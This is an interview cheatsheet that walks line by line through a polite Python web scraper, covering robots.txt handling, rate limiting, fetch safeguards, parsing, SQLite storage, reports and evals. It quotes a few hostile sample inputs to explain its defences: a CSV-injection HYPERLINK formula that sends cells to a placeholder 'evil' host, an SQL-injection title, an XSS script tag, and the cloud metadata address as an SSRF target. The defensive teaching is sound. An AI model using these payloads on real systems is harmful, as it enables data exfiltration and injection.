# Cheatsheet: every line, explained

For technical interviews. Each module is walked top to bottom, with line numbers from `src/scraper/` at v0.1. **Bold questions** are the ones interviewers actually ask about this kind of code, with a short answer you can give out loud.

Contents: [config](#configpy) · [urls](#urlspy) · [robots](#robotspy) · [ratelimit](#ratelimitpy) · [fetcher](#fetcherpy) · [fields](#fieldspy) · [profiles](#profiles__init__py-and-profilesbookspy) · [crawler](#crawlerpy) · [storage](#storagepy) · [report](#reportpy) · [cli](#clipy) · [test site](#the-test-site-srctestsite) · [evals](#the-evals) · [30-second answers](#30-second-answers)

---

## config.py

| Lines | What it does and why |
|---|---|
| 1-6 | Docstring: one frozen dataclass holds every knob. `guard_*` switches exist only so the attack eval can turn one defence off at a time (an *ablation*). |
| 8 | `from __future__ import annotations`: type hints are stored as strings, so `float \| None` works and hints never cost import time. Used in every module. |
| 10 | `asdict`, `dataclass` from the standard library: a dataclass writes `__init__`, `__repr__` and `__eq__` for you from the field list. |
| 12-14 | `DEFAULT_USER_AGENT`: names the bot and gives a URL. RFC 9309 matches robots groups on the **product token** (`web-scraper`), and a site owner who sees us in their logs can find out who we are. Anonymous scrapers get blocked. |
| 17 | `@dataclass(frozen=True)`: settings can't be changed after creation, so one part of the code can't quietly alter another's behaviour. To change one, make a copy: `replace(settings, min_delay_s=0)`. |
| 20 | `user_agent`: sent on every request (set once on the session in `Fetcher.__init__`). |
| 23 | `min_delay_s = 1.0`: the politeness floor, at most one request per second per host. |
| 24-26 | `respect_robots`, `honor_crawl_delay`, `honor_retry_after`: obey the site's three kinds of "please slow down / stay out". |
| 27 | `max_retry_after_s = 120`: a hostile server sending `Retry-After: 99999999` can't park the crawler for three years. |
| 30 | `timeout_s = 10.0`: passed to `requests`, where it limits the *connect* and each *read*. `None` means wait forever (only the ablation uses that). |
| 31 | `guard_total_time`: also apply `timeout_s` to the whole body download (postmortem #2). |
| 32-33 | `max_retries = 3`, `backoff_base_s = 0.5`: up to 4 attempts, waiting ~0.5 s, 1 s, 2 s between them. |
| 34 | `max_bytes = 5_000_000`: a size cap on any response. The underscores are just digit separators. |
| 35 | `max_redirects = 5`: stops a redirect chain going round in circles. |
| 36 | `max_pages = 5_000`: the hard cap on fetches in one run, whatever the site does. This is the backstop behind every other loop guard. |
| 39 | `use_cache`: send conditional GETs (`If-None-Match`) and accept `304`. |
| 42-47 | The defence switches, each matched to one attack in `evals/attack_eval.py`. |
| 49-50 | `as_dict()`: saved into `runs.settings_json`, so every run records exactly how it was configured. |

**Why a frozen dataclass and not a dict or env vars?** Typos fail loudly (`Settings(min_dely_s=1)` is a `TypeError`), the editor autocompletes fields, and immutability means no shared mutable state.

---

## urls.py

| Lines | What it does and why |
|---|---|
| 5 | `urldefrag`, `urljoin`, `urlsplit`, `urlunsplit`: the standard library's URL toolkit. Never build URLs with string concatenation. |
| 7 | `DEFAULT_PORTS`: `:80` on http and `:443` on https are noise, so they're dropped. |
| 10-17 | `normalize`: one canonical spelling per page. Without it, the visited-set thinks `HTTP://Shop/a/../b#top` and `http://shop/b` are two pages. |
| 18 | Strip whitespace and remove tabs and newlines, as the WHATWG URL spec tells browsers to. A gold case (`l03`) had `href="\n  a_1/index.html  "`. |
| 19-20 | `urljoin(base, url)`: resolves relative links. `"page-2.html"` on `/catalogue/page-1.html` becomes `/catalogue/page-2.html`, and `"../../index.html"` climbs two folders. |
| 21 | `urldefrag`: drops `#fragment`. Fragments never reach the server, so they're the same page. |
| 23-27 | Lower-case the scheme and host (case-insensitive by spec), but **not** the path (`/Admin` and `/admin` can be different pages). Keep a non-default port. |
| 28 | Resolve `..` and `.` even when no base was given, by joining against a dummy root. (Found by a unit test: originally `urljoin` only did this when a base was passed.) |
| 29 | Reassemble with an empty fragment. |
| 32-34 | `host_of`: `"a.test:8080"`, the rate limiter's key. The port is included: two ports can be two servers. |
| 37-44 | `in_scope`: only `http`/`https`, only the start host. This blocks `file://`, `javascript:`, and redirects to `169.254.169.254` (the cloud metadata server, a classic SSRF target). |

**What's SSRF?** Server-Side Request Forgery: tricking a program into requesting a URL of the attacker's choosing, usually something internal only that machine can reach. A scraper that follows any redirect is an SSRF waiting to happen.

---

## robots.py

| Lines | What it does and why |
|---|---|
| 1-15 | Docstring: why this module exists (postmortem #1) and what each robots.txt HTTP status means under RFC 9309: 2xx obey, 4xx no rules, 5xx or unreachable stay out entirely. |
| 24 | `FetchText` type: a function `url -> (status, text)`. Robots logic doesn't do HTTP itself, so it's testable with a fake (see `test_robots_fetched_once_per_host`). |
| 27-32 | `_canonical`: `unquote` then `quote` with a fixed safe set, so `/%7Ejoe/` and `/~joe/` compare equal (RFC 9309 2.2.2). `*` and `$` stay literal because they're pattern syntax. |
| 35-49 | `Rule`: one Allow/Disallow line. `__post_init__` runs after the dataclass `__init__` and compiles the pattern to a regex once. |
| 42-46 | Pattern to regex: split on `*`, `re.escape` each literal piece (so `.` and `?` aren't regex syntax), join with `.*`. A trailing `$` becomes a regex end-anchor. `re.DOTALL` makes `.` match newlines too. |
| 48-49 | `regex.match` anchors at the *start*, which is exactly robots' prefix matching: `Disallow: /admin` blocks `/administrator` (gold case `r01`). |
| 52-56 | `Group`: a block of `User-agent:` lines and the rules under them. |
| 59-86 | `parse_groups`, line by line: |
| 63 | `lstrip("﻿")`: remove a UTF-8 byte-order mark. Without this the first line reads `﻿User-agent` and the whole group vanishes (gold `r14`, unsafe on every Python's stdlib). |
| 64 | Drop `# comments`, trim. |
| 65-66 | Skip lines without a colon (blank lines, junk). |
| 67-68 | Split on the *first* colon only (values can contain colons, e.g. `Sitemap: https://...`). Keys are case-insensitive. |
| 69-75 | Consecutive `User-agent:` lines share one group (`r10`). A `User-agent:` after rules starts a new group. |
| 77-78 | Rules before any `User-agent:` belong to no one and are ignored. |
| 79-80 | `Disallow:` with an empty value means "nothing disallowed", so it adds no rule (`r11`). |
| 81-85 | `Crawl-delay` parsed with `float()` so `2.5` works (`c02`), clamped at ≥ 0, ignored if it's not a number. |
| 89-91 | `product_token`: `"web-scraper/0.1 (+https...)"` becomes `"web-scraper"`, the name robots groups are matched on. |
| 101-105 | `_groups_for`: use every group that names us (merged, per RFC). If none does, use the `*` groups. A specific group *replaces* `*`, it doesn't add to it (`r09`). |
| 107-122 | `allowed`: the decision. |
| 108-109 | robots.txt answered 5xx or not at all: stay out of everything. |
| 111-112 | No file (4xx), or asking about `/robots.txt` itself: allowed. |
| 113 | Match against path **plus query**, so `Disallow: /*?sort=` works (`r07`). |
| 114-121 | **Longest match wins; on a tie, Allow wins** (RFC 9309 2.2.2). `Disallow: /` + `Allow: /catalogue/` lets `/catalogue/x` through; `Allow: /catalogue/` + `Disallow: /catalogue/private/` blocks `/catalogue/private/x`. Older stdlib versions took the *first* match and got the second one wrong. |
| 122 | No rule matched: allowed. |
| 124-126 | `crawl_delay`: the largest of the matching groups' delays. When in doubt, be slower. |
| 129-134 | `parse_robots`: the status-code mapping from the docstring. |
| 137-157 | `RobotsCache`: one policy per `scheme://host`, fetched the first time we need it and reused for the whole run. |

**Is robots.txt legally binding?** Not by itself in most places; it's a published request. But ignoring it is the clearest evidence of bad faith, it gets you blocked, and many sites' terms of service reference it. This tool treats it as binding.

**Why 5xx means "disallow everything"?** If the server is struggling, the polite assumption is "don't add load". RFC 9309 says to treat it as complete disallow (and may reuse a cached copy for a while).

---

## ratelimit.py

| Lines | What it does and why |
|---|---|
| 1-7 | Docstring: per-host spacing. Injectable clock and sleep make tests instant (`FakeClock` in the tests just adds numbers). |
| 15-24 | `_last`: when we last contacted each host. `_paused_until`: set by `Retry-After` or backoff. `total_slept_s`: accounting. |
| 19-20 | `time.monotonic` rather than `time.time`: it never jumps backwards when the system clock is adjusted. |
| 26-41 | `wait(host, delay)`: |
| 35-36 | Ready time = later of (last contact + the delay we know **now**) and any pause. "Now" matters: postmortem #3 was booking the slot with the delay known earlier, before robots.txt announced a longer one. |
| 37-40 | Sleep the difference if we're early. |
| 41 | Record this contact. |
| 43-46 | `pause`: "come back in N seconds". `max()` so a short pause never shortens a longer one. |

**Why not a token bucket?** A bucket allows bursts (spend saved-up tokens all at once). A small server would much rather have an even trickle. A fixed minimum gap is simpler and easy to prove from a log.

---

## fetcher.py

The most interview-heavy file. Think of `fetch()` as the doorman and `_get_with_retries()` as the conversation at the door.

| Lines | What it does and why |
|---|---|
| 1-11 | Docstring: the six steps, in order. |
| 17 | `requests`: the HTTP client. One `Session` reuses TCP connections (keep-alive) and sets headers once. |
| 25 | `RETRY_STATUSES = {429, 500, 502, 503, 504}`: "too many requests" and server-side errors are worth retrying. `404` and `403` aren't, because they won't change. |
| 26 | `HTML_TYPES`: the only content types we parse. |
| 29-35 | `Cache` as a `Protocol`: "anything with `cache_get`/`cache_put`". `Store` satisfies it without inheriting from it (structural typing), so the fetcher doesn't import the database. |
| 38-43 | `CachedPage`: a stored body plus the validators (`ETag`, `Last-Modified`) to send next time. |
| 46-65 | `FetchResult`: everything about one fetch. `outcome` is the single word that says what happened. `attempts`, `retries`, `redirects` and `elapsed_ms` feed the report and the evals. `ok` treats `not_modified` as success (we have the body from the cache). |
| 68-73 | Two private exceptions, used to jump out of the read loop. |
| 76-87 | `charset_from_content_type`: read `charset=` from the header if it's **actually there**, else `None`. `requests`' own `response.encoding` invents ISO-8859-1 for `text/*` without a charset, and that's where the famous `Â£51.77` comes from. |
| 90-104 | `parse_retry_after`: the header is either seconds (`120`) or an HTTP date. `parsedate_to_datetime` handles the date form. A date in the past gives 0. Garbage gives `None`. |
| 108-126 | `__init__`: store settings, compute the one allowed host, use the cache only if enabled, set User-Agent and Accept on the session, create the limiter and a **seeded** `random.Random(0)` (so backoff jitter is repeatable in tests). |
| 126 | The robots cache gets `_fetch_robots_text` as its fetch function: dependency injection again. |
| 129-135 | `_fetch_robots_text`: waits its turn like any request, follows redirects (RFC 9309 allows up to 5 for robots.txt), and returns status 0 on any network error, which `parse_robots` treats as "stay out". Truncated at 500 KB (RFC: parse at least 500 KiB). |
| 137-143 | `_delay_for`: our minimum delay, or the site's `Crawl-delay` if that's longer. Never shorter. |
| 146-169 | `fetch`: |
| 147 | Normalise first, so logs and caches use one spelling. |
| 151 | Loop at most `max_redirects + 1` times: one per hop. |
| 152-153 | **Scope check on every hop.** |
| 154-155 | **Robots check on every hop.** A redirect into a disallowed folder is still disallowed. |
| 157-162 | Do the request; accumulate attempts, retries, and network time across hops. |
| 164-166 | A 3xx sets `result.location`: resolve it relative to the current URL (Location can be relative) and go round again. |
| 168-169 | Too many hops: give up with a clear outcome. |
| 172-243 | `_get_with_retries`: |
| 174-179 | **Conditional GET.** If we've seen this URL, send `If-None-Match: <etag>` and/or `If-Modified-Since: <date>`. An unchanged page comes back `304` with no body. |
| 183 | `range(1, max_retries + 2)`: attempts 1..4 with the default of 3 retries. |
| 184 | Wait our turn, *every* attempt, retries included. |
| 185 | `perf_counter`: the highest-resolution clock, used for durations. |
| 188-191 | Too big: give up, no retry. It'll be too big next time too. |
| 192-199 | Connection refused, timeout, or our own `_TooSlowError`: back off and retry, up to the cap. `limiter.pause` makes the wait apply to the whole host, not just this URL. |
| 200-203 | Any other `requests` error (malformed URL, unsupported scheme): don't retry. It's not transient. |
| 207-214 | 429/5xx with retries left: wait `max(backoff, Retry-After)`, capped by `max_retry_after_s`, then go again. |
| 216-217 | Build the result. `bytes_received` is what actually crossed the wire (0 for a 304). |
| 218-224 | A redirect: hand `Location` back to `fetch()` so the next hop is checked. A 3xx without Location is a broken server. |
| 225-227 | `304` and we hold a copy: success, body from cache, outcome `not_modified`. |
| 228-230 | Anything else that isn't 200 (404, a 503 after the last retry...): `http_error`, with the status kept. |
| 232-235 | Only parse `text/html` / `application/xhtml+xml`. An `image/png` that happens to contain HTML is refused (attack `notHtml`). |
| 236 | Keep the raw bytes and the header charset (possibly `None`). |
| 237-240 | Cache the page only if the server gave us a validator; without one, a conditional GET is impossible. |
| 245-273 | `_get_bounded`: |
| 247-248 | `allow_redirects=False` (we handle them, see above) and `stream=True` (don't read the body yet: we want to count it as it arrives). |
| 251-253 | If `Content-Length` already admits it's too big, refuse before reading a byte. |
| 255-264 | Read in pieces with `read1`, which returns as soon as **any** bytes are available. Count as we go and stop at `max_bytes`. A server with no `Content-Length` (the `bomb` attack) can't sneak past. `decode_content=True` means gzip is decompressed first, so the cap applies to the *decompressed* size: a 100 KB gzip that inflates to 1 GB is stopped too. |
| 265-269 | **The total deadline.** `requests`' timeout is per read, so a drip of one byte every 0.25 s never trips it. This check does. (Postmortem #2: it used to sit behind `iter_content(65536)`, which waited for 64 KiB, so it never ran.) |
| 272-273 | `finally: resp.close()`: give the connection back however we leave, including via the exceptions. |
| 275-277 | `_backoff`: exponential (`base * 2^(attempt-1)`) times a random factor between 0.5 and 1.5. The randomness ("jitter") stops a thousand clients that failed together from retrying together. |

**What's the difference between 301, 302, 304?** 301: moved permanently (update your links). 302: moved for now. 304: you already have the current version, nothing sent. The first two have a `Location` header; 304 doesn't.

**What's an ETag?** An opaque version label for a response (often a hash). Send it back as `If-None-Match`, and the server answers `304` if it's still current. It's like asking "is it still edition 3?" instead of buying the book again.

**Why `stream=True`?** Without it, `requests` reads the whole body into memory before you can look at it, so a 20 GB response is 20 GB of RAM.

---

## fields.py

| Lines | What it does and why |
|---|---|
| 13 | `RATING_WORDS`: the rating lives in a CSS class name (`star-rating Three`), not in visible text. |
| 16 | `_PRICE_RE`: either a number with thousands commas (`1,234`) or plain digits, then optionally `.` and 1-2 decimals. `search` (not `match`) skips anything before it: `£`, `Â£`, `GBP `. |
| 18-19 | `_COUNT_RE`: `22 available` or `3 left` (gold `p13`). |
| 21-27 | `clean_text`: NFC-normalise Unicode (so `é` typed two ways compares equal), then `" ".join(text.split())` collapses every run of whitespace (newlines, tabs, non-breaking spaces) into one space. Empty becomes `None`. |
| 30-41 | `parse_price_pence`: drop commas, build `Decimal("1234.50")`, multiply by 100, `int`. **Never float**: `float("1.15") * 100 == 114.99999999999999`. |
| 44-50 | `parse_rating`: first class that's a number word. Case-insensitive. |
| 53-65 | `parse_availability`: "out of stock" is checked **first** ("out of stock" contains "stock"). In stock with a count gives `(True, n)`; without one, `(True, None)`. Unknown wording gives `(None, None)` rather than a guess. |

---

## profiles/\_\_init\_\_.py and profiles/books.py

`__init__.py`: `ListingPage` (item URLs + next URL), `ItemResult` (an item or reasons it was rejected), the `Profile` protocol (name, version, two methods), and `get_profile("books")`. A new site means a new class with those two methods.

`books.py`:

| Lines | What it does and why |
|---|---|
| 19-22 | `make_soup`: **bytes** in, with the header charset if there was one. `"lxml"` is the fastest parser BeautifulSoup supports and is forgiving of broken HTML. |
| 25-28 | `base_url`: if the page has `<base href>`, relative links resolve against *that*, not the page URL (gold `l01`). |
| 31-33 | `current_price_text`: all text nodes inside the price element **except** those inside `<del>`, `<s>`, `<strike>`, so `<del>£20</del> £15` gives £15 (gold `p09`). |
| 36-38 | `table_key`: `"UPC:"`, `" upc "` and `"UPC"` all become `"upc"` (gold `p18`, `p19`). |
| 41-44 | `name`, `default_start_url`, and `version`. Bump `version` whenever parsing changes, so cached 304 pages get re-parsed. |
| 46-58 | `parse_listing`: |
| 50 | `soup.select("article.product_pod h3 a[href]")`: a **CSS selector**. Read it right to left: an `<a>` that has an `href`, inside an `<h3>`, inside an `<article class="product_pod">`. Scoping to product cards is why the hidden honeypot link is never followed. |
| 51-53 | Make each link absolute and keep it only if it's http(s) (skips `javascript:void(0)`, gold `l05`). |
| 55-56 | The site's own pager first (`ul.pager li.next a`), then the standard hints `a[rel~="next"]` and `link[rel~="next"]` (gold `l02`). `~=` means "this word is in the space-separated list". |
| 60-98 | `parse_item`: |
| 62 | Scope everything to `div.product_main`, so a "related products" carousel's prices can't be picked up by mistake. |
| 64-68 | Read the Product Information table into a dict. `row.find("th")` returns the first matching child or `None`. |
| 70 | `main.h1.get_text()`: `get_text()` joins all nested text, so `Night Garden <small>(Hardback)</small>` becomes one title (gold `p17`). Entities like `&amp;` are already decoded by the parser. |
| 72-73 | Price from the main block, falling back to the table. |
| 75-78 | Rating element; availability from the main block or the table. |
| 80-81 | Category = the second-to-last breadcrumb (the last one is the book itself). Needs at least 3 crumbs, otherwise `None` (gold `p20`). |
| 83-84 | Description = the first `<p>` *after* `#product_description` (`~` is the "general sibling" combinator). |
| 86-96 | Assemble the record. |
| 97-98 | **Validation:** title, UPC and price are required. Missing any means `item=None` plus a reason for each. A page is never half-stored. |

**CSS selectors vs XPath?** Same job. CSS is shorter and familiar from web dev. XPath can go *up* the tree and match on text content. BeautifulSoup speaks CSS (via soupsieve); `lxml` speaks both.

---

## crawler.py

| Lines | What it does and why |
|---|---|
| 1-9 | Docstring: the five stop reasons. Every run ends with exactly one, saved on the run. |
| 23-41 | `CrawlStats`: counters for the summary line. `line()` formats it. |
| 44-45 | `crawl(...)`: takes a `fetcher` argument so tests and evals can pass their own (e.g. one with a timed session). |
| 47-49 | Start a run row, start a timer. |
| 51-54 | `seen_listings` (loop guard), `seen_items` (never fetch a book twice per run), `fetches` (the hard cap), `url` (current listing page). |
| 59-69 | Stop checks *before* each listing fetch: no next link means `done`; seen before means `loop`; cap reached means `max_pages`. |
| 71-77 | Fetch the listing and log it. If it failed, we can't know the next page: `listing_error`. |
| 79 | Parse the listing using `final_url` (after redirects), so relative links resolve correctly. |
| 81 | `dict.fromkeys(...)` deduplicates **in order** (a set would scramble it); then drop items already seen. |
| 82-108 | For each new item: |
| 83-84 | Respect the cap mid-page too. |
| 86-89 | Fetch and log. |
| 90-95 | Robots-blocked or out of scope counts as `blocked`; other failures count as `failed`. Both skip to the next item. |
| 97 | Remember the final URL too (after a redirect, that's the book's real address). |
| 98-101 | **304 fast path:** unchanged bytes plus the same parser version means the same book, so skip the parse (postmortem #4). |
| 102-106 | Parse. Rejected pages are logged with reasons. |
| 107-108 | Upsert; `setattr` increments whichever counter matches the returned status. |
| 109 | **Commit once per listing page**: a crash loses at most one page of work, and SQLite isn't committing 1,000 times. |
| 111-118 | After the page: cap reached, or **no new items** (an endless "next" trap that repeats the same products) stops the run. |
| 119 | Follow `next`. |

**How do you avoid crawler traps?** Three independent guards: a visited set (exact loops), no-progress detection (infinite pagination with repeated content), and a hard request cap (anything else). The attack eval shows each one is needed.

---

## storage.py

| Lines | What it does and why |
|---|---|
| 1-10 | Docstring: the six tables. |
| 21-22 | `ITEM_FIELDS`: the fields that define "this book's content". |
| 24-86 | `SCHEMA`, run with `executescript`. `CREATE TABLE IF NOT EXISTS` makes it safe on every start. |
| `books` | `url` is the `PRIMARY KEY`, so one row per book by construction. `price_pence INTEGER`. `content_hash` for change detection, `parser_version` for the 304 fast path, `first_seen_run` / `last_seen_run` / `last_changed_run` for history. |
| `changes` | One row per field that moved: `price_pence 5644 -> 6478 in run 3`. |
| `fetch_log` | One row per URL attempted, the audit trail and the source of every crawl metric. |
| 88-89 | UTC timestamps in ISO format: sortable as text and timezone-safe. |
| 92-95 | `content_hash`: SHA-256 of the JSON list of field values in a fixed order. Same hash, same content. |
| 99-103 | `sqlite3.Row` lets you write `row["title"]`. |
| 121-127 | `log_fetch`: **parameterised** `INSERT` (`?` placeholders). Values never become part of the SQL text, which is why a title of `Robert'); DROP TABLE books;--` is just a title (attack `sqli`). |
| 133-160 | `upsert_book`: look up the URL. Not there: `INSERT`, return `new`. Same hash: bump `last_seen_run`, return `unchanged`. Different hash: write one `changes` row per changed field, `UPDATE` the row, return `changed`. The f-strings only splice in column names from the constant `ITEM_FIELDS`, never data. |
| 162-168 | `mark_seen`: a single `UPDATE ... WHERE url = ? AND parser_version = ?`. `rowcount == 1` means we hold it, parsed by this parser: skip parsing. |
| 174-186 | The HTTP cache. `ON CONFLICT(url) DO UPDATE` is SQLite's upsert. |

**Why SQLite?** Zero setup, one file, real SQL, transactions, and the database the evals open in memory with `":memory:"`. One writer is all a polite crawler needs.

---

## report.py

| Lines | What it does and why |
|---|---|
| 1-10 | `build_summary` makes one dict; four writers render it, so every format shows the same numbers. |
| 22 | `FORMULA_STARTS`: characters that make Excel/Sheets treat a cell as a formula. |
| 25-31 | Nearest-rank `percentile`: sort, take the value at rank ⌈p·n⌉. |
| 38-118 | `build_summary`: crawl metrics from `fetch_log` (outcomes, retries, redirects, bytes, p50/p95 of successful fetches, cache hit rate); catalogue metrics for books seen this run; `changes` for this run; "gone since last run" **only** if this run completed (`stop_reason == "done"`); rejects. |
| 121-131 | `write_reports`: JSON (without the full book list), Markdown, HTML, CSV. |
| 135-139 | `defuse`: prefix `'` to any string starting with `= + - @ \t \r`. In a spreadsheet, `=HYPERLINK("http://evil/?"&A1, "Click")` would send other cells to an attacker (CSV injection). |
| 142-148 | CSV written as `utf-8-sig` (with BOM) so Excel opens `£` and `é` correctly. |
| 152-153 | `_md`: escape `\|` so a title can't break a Markdown table. |
| 217-257 | `render_html`: **every scraped string goes through `html.escape`**. A title of `<script>alert("xss")</script>` shows as text, it doesn't run (attack `xss`). |

---

## cli.py

| Lines | What it does and why |
|---|---|
| 18-19 | `LOCAL_HOSTS`, `MIN_PUBLIC_DELAY_S = 0.5`. |
| 22-30 | Build `Settings` from flags with `replace()`. |
| 33-37 | **Refuse `--delay` under 0.5 s for any non-local host.** Fast is fine against your own test server, rude against anyone else's. |
| 40-59 | `crawl`: run, print the summary line, write reports. Exit code 0 for a normal stop, 1 for an error stop, so shell scripts can tell. |
| 70-83 | `fetch`: a learning tool. Fetch one URL politely and print outcome, status, final URL, attempts, time, bytes, charset. |
| 86-94 | `robots`: what does this site's robots.txt say about this URL? |
| 104-142 | `argparse` subcommands. Each sets `func`, and `main` calls `args.func(args)`. |

---

## The test site (src/testsite/)

- `generator.py`: a seeded `random.Random` builds 1,000 books with mess planted at known rates (tricky titles, £1,000+ prices, no-count stock, missing descriptions, 1% broken pages, 1% redirects, 1% robots-hidden links, 1% 503-then-OK, 0.5% 429-then-OK). `answer_key()` is the truth the evals compare against. `version=2` changes 5% of prices and 3% of stock.
- `pages.py`: renders HTML in the real site's structure (`article.product_pod`, `p.price_color`, `ul.pager li.next`, the Product Information table).
- `server.py`: `ThreadingHTTPServer` on a random free port. Logs every request **on arrival** (path, Host, User-Agent, time), serves ETags and 304s, and sends **no charset** in `Content-Type` on purpose. `/hostile/<attack>/...` are the 14 attack pages.

## The evals

- `accuracy_eval.py`: five held-out sites (seeds 100-104). Field-by-field comparison with the answer key, rejects, robots compliance from the server log, unchanged rerun (304s, bytes), changed rerun (planted vs found price/stock changes), latency, parse time.
- `gold_eval.py` + `gold/cases.py`: 44 frozen hand-written cases.
- `robots_stdlib_compare.py`: the same robots cases through Python's own parser, per Python version.
- `politeness_eval.py`: gaps between requests timed on both client and server, Crawl-delay, User-Agent, disallowed paths.
- `attack_eval.py`: 14 attacks, then the ablation.
- `run_all.py`: runs everything, writes `evals/results/*.json`, rewrites the README table; `--check` fails CI if they disagree.

---

## 30-second answers

**"Walk me through what happens when it fetches a page."** Normalise the URL. Check it's http(s) on our host. Check robots.txt (fetched once, cached). Wait until at least a second since our last request to that host, or longer if robots says so. GET it without following redirects, sending the ETag if we have one. Stream the body, stopping at 5 MB or 10 s total. 429/5xx: back off with jitter, honour Retry-After, at most 3 retries. 3xx: start again with the new URL, so scope and robots are re-checked. 304: use the cached copy. 200 with HTML: hand the bytes to the parser.

**"How do you know it's accurate?"** Three layers: an answer key for 5,000 generated books (100%, but self-graded); a 44-case gold set frozen before the first run (34 → 44); and the honest gap: it hasn't been verified against the live site from the build machine yet.

**"How do you know it's polite?"** The test server logs every request. Zero requests to disallowed paths out of 5,600+. Zero gaps shorter than the configured delay, timed as requests leave and confirmed from the server's clock.

**"What was the hardest bug?"** Python's robots.txt parser gives different, sometimes unsafe answers depending on the Python version. My own eval said 100% because my test site's robots.txt only used simple rules. The frozen gold set caught it.

**"How would you scale it?"** Not by making one site faster: politeness caps that. Many sites in parallel, one queue and one rate limiter per host; sitemaps with `lastmod` to skip unchanged pages; a headless browser only for profiles that need JavaScript.

**"What would you do differently?"** Write the gold set before the generator, not after. And test the robots matcher against a second implementation (e.g. Google's open-source one) from day one.
